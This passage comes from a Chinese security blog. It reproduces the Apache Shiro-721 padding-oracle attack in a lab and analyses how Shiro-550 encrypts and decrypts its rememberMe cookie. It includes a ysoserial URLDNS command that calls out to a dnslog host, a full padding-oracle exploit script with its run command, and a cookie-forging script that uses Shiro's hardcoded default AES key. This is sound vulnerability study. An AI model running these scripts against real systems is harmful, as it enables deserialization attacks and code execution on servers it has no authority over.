        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>这里我直接用的Drunkbaby佬的环境，自己搭建失败了，淦</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack可以绕过密钥直接构造攻击密文，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1<br>Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：</p><ul><li>开启 rememberMe 功能；</li><li>rememberMe 值使用 AES-CBC 模式解密；</li><li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；</li><li>密文可控；</li></ul><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>这里先正常登录，然后抓个登录后的包，这里还是和之前一样得用自己的IP才能抓到<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131964.png" alt="image-20230717113123897"><br>然后利用yso工具生成一个<code>payload.class</code>文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java8 -jar ysoserial-all.jar URLDNS <span class="string">&quot;http://1ovhi7.dnslog.cn&quot;</span> &gt; payload.class</span><br></pre></td></tr></table></figure><p>然后利用[如下exp](<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a>)进行Padding Oracle Attack：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/3ndz/Shiro-721  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode  </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):  </span><br><span class="line">        <span class="built_in">super</span>(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)  </span><br><span class="line">        self.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie  </span><br><span class="line">        <span class="keyword">if</span> self.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):  </span><br><span class="line">            <span class="keyword">del</span> self.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]  </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                response = self.session.get(sys.argv[<span class="number">1</span>],  </span><br><span class="line">                        stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):  </span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">import</span> logging  </span><br><span class="line">    <span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], )  </span><br><span class="line">        sys.exit(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc))</span><br></pre></td></tr></table></figure><p>这个脚本需要python2来运行，然后paddingoracle这个库直接在上面那个项目里面下载然后放到python2对应的库存放位置就行，我的地址如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131460.png" alt="image-20230717113137408"><br>然后运行脚本爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://<span class="number">172.21</span><span class="number">.97</span><span class="number">.44</span>:<span class="number">8081</span>/shiro721_war/account/ nAIv7BZvX7caZvpwmOXX081j1JGGQGBL936tN9gkgCcymvbHnt7Vgj8Alu7pBZSwFHbbUa776DI4T1WGeJ7YguSZOLuinOaIW1iHjwi0P1YFNcf0ZIYTimmKL0u3tWeGpTS276V9WqdYhd1oCsI7R/4wlZ28rodMjoNeADon742+JG4Mbj6ihQKNBL+mklXa/+u5tpd6NfbEbASAFSlQ8H/MdbwzhqVXyMOvteNR26adkcWJKZDhKBy5GE68fPi7OHWcSVsl6ZZUMTAZcsIiwzg9O/XDUEkAzK1TMEf3iibRbHhfD6jzNorfcEM9DZTZ6trEX8+TFHc6DHyVZE8I6De6+Iyq3Ysr0N222YRwc2uYc2UYMrZPho1p/JheNPJGN+DolcM03d8HxJF4tSDepkvn8uYzjps+U+h++zqAqWrkkDzG7vTJP7Zo9Z5YONCSuYRq3k7vL0sqoO+PRQ+18JNAOYi2Jjlu0y3JpYX1eROnIbVMp1lF81d9UIgueJuT payload.<span class="keyword">class</span></span><br></pre></td></tr></table></figure><p>然后利用爆破生成的cookie去打DNS就行，脚本作者说差不多一小时，其实这里大概几分钟就行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131919.png" alt="image-20230717113145827"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131549.png" alt="image-20230717113153511"><br>这里也可以利用飞鸿师傅的工具去打也行<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">Shiro550&#x2F;Shiro721 一键化利用工具</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>在shiro550中密钥是硬编码，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在Shiro721中，密钥的生成方式变为了动态生成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后跟进调试一下，断点如下，shiro通过<code>generateNewKey()</code>方法获取密钥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132306.png" alt="image-20230717113207176"><br>进入<code>generateNewKey()</code>方法，这里初始化了一个KeyGenerator对象，并且调用了init<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132520.png" alt="image-20230717113216295"><br>继续跟进看看，这里获取到了一个随机数发生器<code>SecureRandom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132709.png" alt="image-20230717113226497"><br>然后下一步调用了<code>generateKey()</code>跟进看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132397.png" alt="image-20230717113235333"><br>跟进之后发现这里调用了<code>engineGenerateKey()</code>跟进去发现是个抽象类中的抽象方法，找到它的实现，在下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132628.png" alt="image-20230717113244391"><br>在这里已经生成了一串16字节的随机序列，然后返回一个<code>SecretKeySpec</code>对象，再使用<code>getEncoded()</code>方法获取<code>key</code>密钥序列，然后继续跟到<code>getEncoded()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132164.png" alt="image-20230717113254957"><br>这整个过程就是密钥生成的完整过程，调试能力太差了，不知道是不是没下源码的原因很多类都是class文件不太好调，都是直接下的断点</p><h3 id="Padding-Oracle-Attack攻击中的布尔条件"><a href="#Padding-Oracle-Attack攻击中的布尔条件" class="headerlink" title="Padding Oracle Attack攻击中的布尔条件"></a>Padding Oracle Attack攻击中的布尔条件</h3><p>以下内容参考<a href="https://goodapple.top/archives/261">Java反序列化漏洞——Shiro721 - 枫のBlog (goodapple.top)</a>我这里就是跟着走一遍<br>Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件<br>在 Apache Shiro 的场景中，这个服务端的两个不同的响应特征为：</p><ul><li>Padding Oracle 错误时，服务端响应报文的 Set-Cookie 头字段返回 <code>rememberMe=deleteMe</code>；</li><li>Padding Oracle 正确时，服务端返回正常的响应报文内容；<br>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的 Cookie，Shiro 是怎么处理的呢？</li></ul><h4 id="Padding错误处理"><a href="#Padding错误处理" class="headerlink" title="Padding错误处理"></a>Padding错误处理</h4><p>解密函数在<code>AbstractRememberMeManager.decrypt()</code>中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133587.png" alt="image-20230717113306451"><br>跟进<code>cipherService.decrypt()</code>，最后到<code>crypt()</code>中调用<code>doFinal()</code>方法，这里我直接下断点了，一步步调问题太多了，也有可能是我调试能力差<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133802.png"><br><code>doFinal()</code>方法有<code>IllegalBlockSizeException</code>和<code>BadPaddingException</code>这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到<code>crypt()</code>方法中，最终被<code>getRememberedPrincipals()</code>方法捕获，并执行<code>onRememberedPrincipalFailure()</code>方法。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133742.png" alt="image-20230717113350548"><br><code>onRememberedPrincipalFailure()</code>方法调用了<code>forgetIdentity()</code>。该方法会调用<code>removeFrom()</code>，在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code>。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133541.png" alt="image-20230717113359308"><br>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code> 。</p><h5 id="Padding正确，反序列化处理"><a href="#Padding正确，反序列化处理" class="headerlink" title="Padding正确，反序列化处理"></a>Padding正确，反序列化处理</h5><p>CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了。<br>Shiro中关于反序列化的处理在<code>DefaultSerializer</code>类的<code>deserialize()</code>方法下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134120.png" alt="image-20230717113411895"><br>如果反序列化的结果错误，则会抛出异常。最后异常仍会被 <code>getRememberedPrincipals()</code> 方法处理。继续往下跟即可看到来到了<code>getRememberedPrincipals()</code> 方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134178.png" alt="image-20230717113437985"><br>这也就是上面讲的 response 包里会回显 302 且 <code>rememberMe=deleteMe</code><br>但是对于 Java 来说，反序列化是以 Stream 的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。后面的测试直接贴了上面那个大佬的测试图。<br>获取正常用户的 Cookie 并使用密钥解密，可以看到最后填充的数据为 <code>0x0B</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134335.png" alt="image-20230717113452298"><br>下面我们将其更改为其他合法填充方式，然后加密发送出去<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134246.png" alt="image-20230717113459220"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171135271.png" alt="image-20230717113516223"><br>服务器端正常响应，于是这里就构造出了布尔条件</p><ul><li>Padding 正确，服务器正常响应</li><li>Padding 错误，服务器返回 <code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><ol><li>由于这种方法需要爆破得到key，因此可以对短时间内多次访问的ip进行禁止访问操作，达到防御目的。</li><li>升级至安全版本。</li><li>关闭rememberMe持久化登录功能。<br>参考借鉴：<br><a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack">Java反序列化Shiro篇02-Shiro721流程分析 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://goodapple.top/archives/261">Java反序列化漏洞——Shiro721 - 枫のBlog (goodapple.top)</a><a href="https://blog.csdn.net/qq_41874930/article/details/121314926">shiro 721 反序列化漏洞复现与原理以及Padding Oracle Attack攻击加解密原理_shiro反序列化原理_Shanfenglan7的博客-CSDN博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之Shiro550</title>
      <link href="/undefined/58825.html"/>
      <url>/undefined/58825.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>jdk8u65</li><li><a href="https://tomcat.apache.org/download-80.cgi">Tomcat8</a></li><li>shiro 1.2.4<br>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4<br>环境具体的配置参考：<a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Java反序列化Shiro篇01-Shiro550流程分析 | Drunkbaby’s Blog (drun1baby.top)</a></li></ul><h2 id="shiro-550分析"><a href="#shiro-550分析" class="headerlink" title="shiro-550分析"></a>shiro-550分析</h2><p>哎，终于到了shiro，虽然很少遇到这个漏洞但是这个还是挺重要的<br>抓个登录的包，勾选 RememberMe 字段<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171119869.png" alt="image-20230717111933757"><br>可以看到这个cookie明显是通过加密的，那么就去分析一下这个cookie的生成过程，idae里面按两下shift可以输入cookie然后会把和cookie这个名字有关的类列出来，最终我们找到了<code>CookieRememberMeManager</code>类中的 <code>getRememberedSerializedIdentity()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120300.png" alt="image-20230717112028101"><br>这个方法先判断是否为http请求，如果是则会获取remember me的cookie值，然后判断是否是deleteMe，不是则判断是否是符合 base64 编码，然后再对其进行 base64 解码，将解码结果返回，那么往上找谁调用了这个方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171120849.png" alt="image-20230717112037436"><br>找到了<code>AbstractRememberMeManager</code> 这个类的 <code>getRememberedPrincipals()</code> 方法，这里要把对应的源码下载find usages才能搜到，这个方法的作用域为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。393行将 HTTP Requests 里面的 Cookie 拿出来，赋值给 bytes 数组；396 行将 bytes 数组的东西进行 <code>convertBytesToPrincipals()</code> 方法的调用，并将值赋给 principals 变量，<code>convertBytesToPrincipals</code>方法将之前的 bytes 数组转换成了认证信息，并且对其进行解密和反序列化<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121265.png" alt="image-20230717112102085"></p><h3 id="decrypt-解密"><a href="#decrypt-解密" class="headerlink" title="decrypt()解密"></a>decrypt()解密</h3><p>我们跟进一下<code>decrypt()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121435.png" alt="image-20230717112126287"><br>487 行这里获取了密钥服务，再往后 489 行的 <code>decrypt()</code> 跟进去，发现它是一个接口。我们可以看一下它的参数名第一个要加密的数组，第二个是一个 key，说明这是一个对称加密<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171121534.png" alt="image-20230717112158412"><br>回到之前 <code>decrypt()</code> 方法的第 489 行，两个传参，第一个是加密字段，第二个是 key，跟进传入的 <code>getDecryptionCipherKey()</code>最终发现它是一个返回的常量<code>decryptionCipherKey</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122240.png" alt="image-20230717112212188"><br>然后find usages寻找哪里调用了它，在同类下的<code>setDecryptionCipherKey()</code>里找到了它的调用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122098.png" alt="image-20230717112221010"><br>然后再找一下<code>setDecryptionCipherKey()</code>的调用，在同类下的<code>setCipherKey()</code>方法中调用了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122213.png" alt="image-20230717112229102"><br>然后继续看哪里调用了<code>setCipherKey()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122886.png" alt="image-20230717112241693"><br>到这里跟进去发现<code>DEFAULT_CIPHER_KEY_BYTES</code>是个固定的值<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171122054.png" alt="image-20230717112257933"><br>也就是说在Shiro1.2.4 及之前的版本中对remember me加密的key是一个固定的key，其实加密算法就是AES加密</p><h3 id="deserialize反序列化"><a href="#deserialize反序列化" class="headerlink" title="deserialize反序列化"></a>deserialize反序列化</h3><p>来到一开始的<code>convertBytesToPrincipals()</code>方法找到<code>deserialize()</code>方法点进来到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123340.png" alt="image-20230717112312266"><br>这里再点进去其实是一个接口，然后继续查看哪里调用了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123313.png" alt="image-20230717112319911"><br>在shiro包的<code>deserialize</code>方法中调用了<code>readObject()</code>方法后面就会进到HashMap这就是一个很好的入口，到这里解密的过程就结束了，接下来去跟一下加密的过程</p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>加密通过调试来分析，断点下在如下图<code>onSuccessfulLogin()</code>位置<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123238.png" alt="image-20230717112334025"><br>这里怎么进到这个断点呢？就是我们在一开始登录的页面开启代理<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171123328.png" alt="image-20230717112344273"><br>当断点下好之后点击sign in即可到断点位置，当然也可用burp发包开始调试，在如下位置对是否点击了Remember Me进行判断，如下点击了会将rememberMe赋值为true<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124686.png" alt="image-20230717112404419"><br>然后到这个rememberIdentity方法，这里就是用于用户名赋值保存，可以看到这里一系列调用完之后得到了用户名<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124274.png" alt="image-20230717112417095"><br>然后进入到rememberIdentity方法继续看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124709.png" alt="image-20230717112426588"><br>这里的convertPrincipalsToBytes和之前解密的<code>convertBytesToPrincipals()</code>非常相似不过解密变为了加密，反序列化变为了序列化<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124313.png" alt="image-20230717112440188"><br>然后进入到序列化的这里（到上面这一步之后一直F7就行）可以看到和反序列化过程一样<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171124472.png" alt="image-20230717112451267"><br>然后回到 encrypt 加密这里，进入<code>getEncryptionCipherKey()方法</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125880.png" alt="image-20230717112500712"><br>一直跟下去之后发现最后调用的key就是我们之前找到的那个常量<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125038.png" alt="image-20230717112509939"><br>cookie通过AES加密之后再base64得到，到这里差不多分析结束</p><h2 id="Shiro-550-漏洞利用"><a href="#Shiro-550-漏洞利用" class="headerlink" title="Shiro-550 漏洞利用"></a>Shiro-550 漏洞利用</h2><p>这里用了一个插件名为Maven Helper分析pom.xml<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171125398.png" alt="image-20230717112524077"><br>其实这里有很多包在test下，看组长的视频说test是打不到的，但是不知道为什么我的插件没有显示很奇怪</p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>这里我们的攻击思路就是直接替换加密后的cookie，那么就需要一个加密的脚本，这里直接用Drunkbaby师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8  </span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36  </span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby  </span></span><br><span class="line"><span class="comment"># @FileName: poc.py  </span></span><br><span class="line"><span class="comment"># @Software: VSCode  </span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base  </span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> mode  </span><br><span class="line"><span class="keyword">import</span> uuid  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):  </span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">  data = f.read()  </span><br><span class="line"> <span class="keyword">return</span> data  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):  </span><br><span class="line"> BS = AES.block_size  </span><br><span class="line"> pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = uuid.uuid4().<span class="built_in">bytes</span>  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))  </span><br><span class="line"> <span class="keyword">return</span> ciphertext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):  </span><br><span class="line"> enc_data = base64.b64decode(enc_data)  </span><br><span class="line"> unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]  </span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>  </span><br><span class="line"> mode = AES.MODE_CBC  </span><br><span class="line"> iv = enc_data[:<span class="number">16</span>]  </span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)  </span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])  </span><br><span class="line"> plaintext = unpad(plaintext)  </span><br><span class="line"> <span class="keyword">return</span> plaintext  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line"> data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)  </span><br><span class="line"> <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure><p>然后因为URLSDNS这条链不依赖于CC包，所以用来验证漏洞，那么先将payload通过AES加密然后base64，exp如下是之前跟URLDNS这条链子写的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 